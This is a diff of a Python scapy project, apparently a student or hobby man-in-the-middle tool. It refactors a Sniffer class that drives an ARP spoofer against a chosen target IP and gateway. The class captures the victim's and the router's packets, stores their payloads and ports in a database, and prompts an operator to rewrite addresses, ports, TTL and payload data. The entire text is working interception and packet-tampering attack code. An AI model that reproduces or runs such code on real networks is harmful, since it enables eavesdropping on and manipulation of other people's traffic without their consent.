@@ -4,12 +4,16 @@ from scapy.layers.inet import IP, TCP
 from arpspoofer import ArpSpoofer
 from database import DataBase
 
-class sniffer:
 
-    def __init__(self):
-        self.spoofer = ArpSpoofer()
+class Sniffer:
+
+    def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
+        self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
         self.db = DataBase()
         self.packets = 0
+
+    def start_spoofing(self):
+        self.spoofer.start()
 
     def victim_filter(self, packet):
         return packet[IP].src == self.spoofer.targetIP
@@ -34,7 +38,7 @@ class sniffer:
         if dst_ip != None:
             packet[IP].dst = dst_ip
         if req_type != None:
-            req=self.find_req_type(packet)
+            req = self.find_req_type(packet)
             packet[Raw].replace(req, req_type)
         if data != None:
             packet[Raw].load = data
@@ -47,7 +51,7 @@ class sniffer:
         if ttl != None:
             packet[IP].ttl = ttl
 
-    def find_req_type(self,packet):
+    def find_req_type(self, packet):
         txt = packet[Raw].load
         list = txt.split()
         return list[0]
@@ -60,19 +64,22 @@ class sniffer:
         packet[Raw].load = list
 
     def handle_packets_from_victim(self):
+        print("start h/p/v")
         packet = self.receive_victim()
-        self.db.write_to_victim(self.packets,packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
+        self.db.write_to_victim(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
+                                packet[Raw].load,
                                 packet[TCP].sport, packet[TCP].dport)
-        # TODO: check what fetch returns
+        # fetchall returns list of tupples
         self.db.get_from_router(self.packets, True, True, True, True, True, True, True, True, True)
-        self.packets+=1
+        self.packets += 1
         param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
                       "src_port": None, "dst_port": None, "ttl": None}
         for key in param_dict:
             param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
             if (param != ''):
-                param_dict[key]=param
-        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"], param_dict["req_params"],
+                param_dict[key] = param
+        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
+                         param_dict["req_params"],
                          param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
         self.db.write_to_victim_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
                                         packet[TCP].sport, packet[TCP].dport)
@@ -80,18 +87,20 @@ class sniffer:
 
     def handle_packets_from_router(self):
         packet = self.receive_router()
-        self.db.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
+        self.db.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
+                                packet[Raw].load,
                                 packet[TCP].sport, packet[TCP].dport)
-        #TODO: check what fetch returns
-        self.db.get_from_router(self.packets,True,True,True,True,True,True,True,True,True)
-        self.packets+=1
+        # fetchall returns list of tupples
+        self.db.get_from_router(self.packets, True, True, True, True, True, True, True, True, True)
+        self.packets += 1
         param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
                       "src_port": None, "dst_port": None, "ttl": None}
         for key in param_dict:
             param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
             if (param != ''):
-                param_dict[key]=param
-        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"], param_dict["req_params"],
+                param_dict[key] = param
+        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
+                         param_dict["req_params"],
                          param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
         self.db.write_to_router_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
                                         packet[TCP].sport, packet[TCP].dport)
